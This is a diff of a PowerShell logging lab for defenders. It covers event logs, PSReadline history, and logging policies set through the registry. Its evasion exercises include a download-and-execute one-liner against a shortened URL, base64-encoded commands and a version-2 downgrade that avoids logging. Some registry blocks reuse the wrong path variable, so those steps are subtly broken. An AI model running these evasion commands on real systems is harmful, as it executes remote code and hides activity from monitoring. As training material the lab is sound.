@@ -1,175 +1,168 @@
 break
 
-# Lab 01 - Windows PowerShell Logging 
+# Lab 01 - Windows PowerShell Logging
 
- ## Objective 
+## Objective
 
- ## Overview 
+## Overview
 
- ## Exercise 1.1 - Stuff you get out-of-the-box with no configuration 
+## Exercise 1.1 - Stuff you get out-of-the-box with no configuration
 
- ### 1.1.1 Pipeline Execution Logging 
+### 1.1.1 Pipeline Execution Logging
 
- 400 - PowerShell host start (ie. when you opened the blue window) 
+Get-WinEvent -ListLog *powershell*
 
- 800 - These occur in pairs: the first event showing the command and the second showing the output. 
+Get-WinEvent -LogName 'Windows PowerShell' -FilterXPath '*[System[(EventID=800)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap
 
- 403 - Session end (when the entire PowerShell host closes) 
+### 1.1.2 PSReadline Command History
 
- Get-WinEvent -ListLog *powershell* 
+Get-Module - notice PSReadline is pre-loaded on Windows 10
 
- Get-WinEvent -LogName 'Windows PowerShell' -FilterXPath '*[System[(EventID=800)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap 
+Get-Command -Module PSReadline
 
- ### 1.1.2 PSReadline Command History 
+Get-PSReadlineOption - notice the properties MaximumHistoryCount and HistorySavePath
 
- Get-Module - notice PSReadline is pre-loaded on Windows 10 
+Get-Content (Get-PSReadlineOption).HistorySavePath
 
- Get-Command -Module PSReadline 
+Get-PSReadlineOption - notice the properties MaximumHistoryCount and HistorySavePath
 
- Get-PSReadlineOption - notice the properties MaximumHistoryCount and HistorySavePath 
+Get-Item C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\*.txt
 
- Get-Content (Get-PSReadlineOption).HistorySavePath 
+Select-String -Path (Get-PSReadlineOption).HistorySavePath -Pattern 'module'
 
- Get-PSReadlineOption - notice the properties MaximumHistoryCount and HistorySavePath 
+Select-String -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\*.txt -Pattern 'module'
 
- Get-Item C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\*.txt 
+Remove-Module PSReadline
 
- Select-String -Path (Get-PSReadlineOption).HistorySavePath -Pattern 'module' 
+### 1.1.3 Script Block Logging (Without Policy Implementation)
 
- Select-String -Path C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\*.txt -Pattern 'module' 
+Add-Type -AssemblyName System.Speech
 
- Remove-Module PSReadline 
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4104)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap
 
- ### 1.1.3 Script Block Logging (Without Policy Implementation) 
+### 1.1.4 AntiMalware Scan Interface (AMSI)
 
- Add-Type -AssemblyName System.Speech 
+Get-WinEvent -ListLog *defender*
 
- Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4104)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap 
+Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -FilterXPath "*[System[((EventID=1116) or (EventID=1117))]]" -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap
 
- ### 1.1.4 AntiMalware Scan Interface (AMSI) 
+iex 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c138 6'
 
- Get-WinEvent -ListLog *defender* 
+## Exercise 1.2 - PowerShell Policies
 
- Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -FilterXPath "*[System[((EventID=1116) or (EventID=1117))]]" -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap 
+### 1.2.1 Module Logging
 
- iex 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386' 
+Get-Module -ListAvailable | Format-Table Name, LogPipelineExecutionDetails
 
- ## Exercise 1.2 - PowerShell Policies 
+#region
+    Import-Module NetAdapter
+    $m = Get-Module NetAdapter
+    $m.LogPipelineExecutionDetails = $true
+#endregion
 
- ### 1.2.1 Module Logging 
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4103)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap
 
- Get-Module -ListAvailable | Format-Table Name, LogPipelineExecutionDetails 
+#region
+    $BasePath   = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging'
+    $ModulePath = $BasePath + '\ModuleNames'
+    New-Item $ModulePath -Force
+    New-ItemProperty $BasePath -Name EnableModuleLogging -Value 1 -PropertyType DWord
+    New-ItemProperty $ModulePath -Name '*' -PropertyType String
+#endregion
 
- #region
-     Import-Module NetAdapter 
-     $m = Get-Module NetAdapter 
-     $m.LogPipelineExecutionDetails = $true 
- #endregion
+Get-ChildItem HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ -Recurse
 
- Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4103)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap 
+### 1.2.2 Script Block Logging
 
- #region
-     $BasePath   = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging' 
-     $ModulePath = $BasePath + '\ModuleNames' 
-     New-Item $ModulePath -Force 
-     New-ItemProperty $BasePath -Name EnableModuleLogging -Value 1 -PropertyType DWord 
-     New-ItemProperty $ModulePath -Name '*' -PropertyType String 
- #endregion
+#region
+    $BasePath   = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'
+    New-Item $ModulePath -Force
+    New-ItemProperty $basePath -Name EnableScriptBlockLogging -Value 1 -PropertyType DWord
+#endregion
 
- Get-ChildItem HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ -Recurse 
+Get-ChildItem HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ -Recurse
 
- ### 1.2.2 Script Block Logging 
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4104)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap
 
- #region
-     $BasePath   = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' 
-     New-Item $ModulePath -Force 
-     New-ItemProperty $basePath -Name EnableScriptBlockLogging -Value 1 -PropertyType DWord 
- #endregion
+### 1.2.3 Transcription
 
- Get-ChildItem HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ -Recurse 
+#region
+    $BasePath   = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription'
+    New-Item $ModulePath -Force
+    New-ItemProperty $basePath -Name EnableTranscripting -Value 1 -PropertyType DWord
+    New-ItemProperty $basePath -Name OutputDirectory -Value 'C:\PSTranscripts' -PropertyType String
+    New-ItemProperty $basePath -Name EnableInvocationHeader -Value 1 -PropertyType DWord
+#endregion
 
- Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath '*[System[(EventID=4104)]]' -MaxEvents 5 | Format-Table TimeCreated, Message -Wrap 
+Get-ChildItem HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ -Recurse
 
- ### 1.2.3 Transcription 
+## Exercise 1.3 - Evasion Techniques
 
- #region
-     $BasePath   = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' 
-     New-Item $ModulePath -Force 
-     New-ItemProperty $basePath -Name EnableTranscripting -Value 1 -PropertyType DWord 
-     New-ItemProperty $basePath -Name OutputDirectory -Value 'C:\PSTranscripts' -PropertyType String 
-     New-ItemProperty $basePath -Name EnableInvocationHeader -Value 1 -PropertyType DWord 
- #endregion
+### 1.3.1 Fileless Malware
 
- Get-ChildItem HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ -Recurse 
+iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
 
- ## Exercise 1.3 - Evasion Techniques 
+### 1.3.2 Obfuscation
 
- ### 1.3.1 Fileless Malware 
+iex ”’$(“B” + "e sure to" + ' drink yo' + 'ur Oval' + "tine!”)’”
 
- iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w") 
+#region
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(@"
+iex ”’$(“B” + "e sure to" + ' drink yo' + 'ur Oval' + "tine!”)’”
+"@
+))
+#endregion
 
- ### 1.3.2 Obfuscation 
+powershell -enc aQBlAHgAIAAdIBkgQgBlACAAcwB1AHIAZQAgAHQAbwAgAGQAcgBpAG4AawAgAHkAbwB1AHIAIABPAHYAYQBsAHQAaQBuAGUAIQAZIB0g
 
- iex ”’$(“B” + "e sure to" + ' drink yo' + 'ur Oval' + "tine!”)’” 
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("aQBlAHgAIAAdIBkgQgBlACAAcwB1AHIAZQAgAHQAbwAgAGQAcgBpAG4AawAgAHkAbwB1AHIAIABPAHYAYQBsAHQAaQBuAGUAIQAZIB0g"))
 
- #region
-     [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(@" 
-     iex ”’$(“B” + "e sure to" + ' drink yo' + 'ur Oval' + "tine!”)’” 
-     "@ 
-     )) 
- #endregion
+### 1.3.3 Version Downgrade
 
- powershell -enc aQBlAHgAIAAdIBkgQgBlACAAcwB1AHIAZQAgAHQAbwAgAGQAcgBpAG4AawAgAHkAbwB1AHIAIABPAHYAYQBsAHQAaQBuAGUAIQAZIB0g 
+powershell.exe -version 2 -command "Can you see me now?"
 
- [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("aQBlAHgAIAAdIBkgQgBlACAAcwB1AHIAZQAgAHQAbwAgAGQAcgBpAG4AawAgAHkAbwB1AHIAIABPAHYAYQBsAHQAaQBuAGUAIQAZIB0g")) 
+Get-WindowsOptionalFeature -Online -FeatureName *V2*
 
- ### 1.3.3 Version Downgrade 
+Get-WindowsOptionalFeature -Online -FeatureName *V2* | ForEach-Object {Disable-WindowsOptionalFeature -Online -FeatureName $_.FeatureName -Verbose}
 
- powershell.exe -version 2 -command "Can you see me now?" 
+### 1.3.4 Version Upgrade
 
- Get-WindowsOptionalFeature -Online -FeatureName *V2* 
+### 1.3.5 Cached Policy Disable
 
- Get-WindowsOptionalFeature -Online -FeatureName *V2* | ForEach-Object {Disable-WindowsOptionalFeature -Online -FeatureName $_.FeatureName -Verbose} 
+## Exercise 1.4 - Automating the Investigation
 
- ### 1.3.4 Version Upgrade 
+### 1.4.1 Enable Logging Enterprise-Wide
 
- ### 1.3.5 Cached Policy Disable 
+### 1.4.2 Increase Log Size
 
- ## Exercise 1.4 - Automating the Investigation 
+Get-WinEvent -ListLog *powershell*
 
- ### 1.4.1 Enable Logging Enterprise-Wide 
+wevtutil.exe set-log Microsoft-Windows-PowerShell/Operational /maxsize:$(1gb)
 
- ### 1.4.2 Increase Log Size 
+### 1.4.3 Purge Transcripts
 
- Get-WinEvent -ListLog *powershell* 
+#region
+$basePath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription"
+if(Test-Path $basePath) {
+    $a = Get-ItemProperty $basePath -Name OutputDirectory | Select-Object -ExpandProperty OutputDirectory
+    If (!$?) {'Not Configured'} Else {
+        If (Test-Path -Path $a) {
+            $RetentionDays = 14
+            Get-ChildItem -Path $a -Recurse |
+                Where-Object {$_.CreationTime -lt (Get-Date).AddDays(-1 * $RetentionDays)} |
+                Remove-Item -Force -Confirm:$false -Recurse
+        } Else {
+            'Log path not found.'
+        }
+    }
+} Else {
+    'Not Configured'
+}
+#endregion
 
- wevtutil.exe set-log Microsoft-Windows-PowerShell/Operational /maxsize:$(1gb) 
+### 1.4.4 Collect Data From All Locations
 
- ### 1.4.3 Purge Transcripts 
+### 1.4.5 Windows Event Forwarding
 
- #region
- $basePath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" 
- if(Test-Path $basePath) { 
-     $a = Get-ItemProperty $basePath -Name OutputDirectory | Select-Object -ExpandProperty OutputDirectory 
-     If (!$?) {'Not Configured'} Else { 
-         If (Test-Path -Path $a) { 
-             $RetentionDays = 14 
-             Get-ChildItem -Path $a -Recurse | 
-                 Where-Object {$_.CreationTime -lt (Get-Date).AddDays(-1 * $RetentionDays)} | 
-                 Remove-Item -Force -Confirm:$false -Recurse 
-         } Else { 
-             'Log path not found.' 
-         } 
-     } 
- } Else { 
-     'Not Configured' 
- } 
- #endregion
-
- ### 1.4.4 Collect Data From All Locations 
-
- ### 1.4.5 Windows Event Forwarding 
-
- ### 1.4.6 Logging Inception 
-
+### 1.4.6 Logging Inception
 
